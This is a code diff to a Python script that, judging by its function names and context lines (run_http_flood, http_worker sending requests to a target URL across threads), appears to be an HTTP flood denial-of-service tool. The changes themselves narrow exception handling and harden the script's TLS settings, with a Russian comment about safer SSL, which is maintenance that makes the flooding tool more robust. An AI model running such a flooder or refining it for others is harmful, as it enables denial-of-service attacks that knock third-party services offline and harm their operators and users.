@@ -160,7 +160,7 @@ def cleanup_sockets(dead_sockets, sockets):
             sockets.remove(s)
             try:
                 s.close()
-            except:
+            except (socket.error, OSError, AttributeError):
                 pass
 
 
@@ -236,7 +236,7 @@ def http_worker(target_url, count, ctx=None):
                 with socket.create_connection((host, port), timeout=2) as sock:
                     sock.sendall(req)
                     sock.recv(1)
-        except Exception:
+        except (socket.error, OSError, ssl.SSLError, ConnectionError, TimeoutError):
             pass
 
 
@@ -251,6 +251,12 @@ def run_http_flood(target_url, packages, threads):
         ctx = ssl.create_default_context()
         ctx.check_hostname = True
         ctx.verify_mode = ssl.CERT_REQUIRED
+        # Используем более безопасные настройки SSL
+        ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
+        ctx.options |= ssl.OP_NO_SSLv2
+        ctx.options |= ssl.OP_NO_SSLv3
+        ctx.options |= ssl.OP_NO_TLSv1
+        ctx.options |= ssl.OP_NO_TLSv1_1
 
     base_count = packages // threads
     remainder = packages % threads
